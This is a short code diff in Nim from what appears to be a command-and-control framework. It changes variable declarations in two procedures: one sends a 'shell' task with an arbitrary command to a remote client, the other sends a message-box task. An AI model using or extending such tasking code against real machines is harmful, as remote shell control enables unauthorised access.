@@ -13,7 +13,7 @@ proc awaitResponse*(client: C2Client) {.async.} =
     await client.server.clRespFuture[]
 
 proc sendShellCmd*(client: C2Client, cmd: string) {.async.} =
-    var j = %*
+    let j = %*
         {
             "task": "shell",
             "shellCmd": cmd
@@ -21,7 +21,7 @@ proc sendShellCmd*(client: C2Client, cmd: string) {.async.} =
     await client.sendTask($j)
 
 proc sendMsgBox*(client: C2Client, title: string, caption: string) {.async.} =
-    var j = %*
+    let j = %*
         {
             "task": "msgbox",
             "title": title,
